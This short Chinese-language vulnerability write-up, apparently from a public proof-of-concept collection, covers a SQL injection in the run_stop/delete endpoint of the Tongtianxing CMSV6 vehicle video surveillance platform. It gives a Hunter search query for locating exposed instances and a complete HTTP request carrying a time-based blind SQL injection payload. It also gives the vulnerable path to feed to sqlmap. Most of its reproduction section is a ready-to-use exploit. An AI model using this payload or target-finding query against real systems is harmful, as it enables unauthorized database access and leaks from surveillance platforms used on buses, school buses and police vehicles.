# 通天星CMSV6车载视频监控平台 run_stop/delete存在SQL注入漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台run_stop/delete存在SQL注入漏洞，攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/GsVEgLsQEOTVpq0J/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-051769.png)

# 四、漏洞复现
```plain
GET /run_stop/delete.do;downloadLogger.action?ids=1+AND+%28SELECT+4195+FROM+%28SELECT%28SLEEP%283%29%29%29BDMG%29 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=6D759FDA5ECC223DF29DFE45859F13DC
Upgrade-Insecure-Requests: 1
```

![1711706599578-2ac6a406-86bb-4b63-9b20-75c9f88b3331.png](./img/GsVEgLsQEOTVpq0J/1711706599578-2ac6a406-86bb-4b63-9b20-75c9f88b3331-964758.png)

sqlmap

```plain
/run_stop/delete.do;downloadLogger.action?ids=1
```

![1711706619835-8f722db4-84ac-4323-93ff-d2c308201ca6.png](./img/GsVEgLsQEOTVpq0J/1711706619835-8f722db4-84ac-4323-93ff-d2c308201ca6-175576.png)



> 更新: 2024-12-28 13:05:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qws2rrcs8vegdmm8>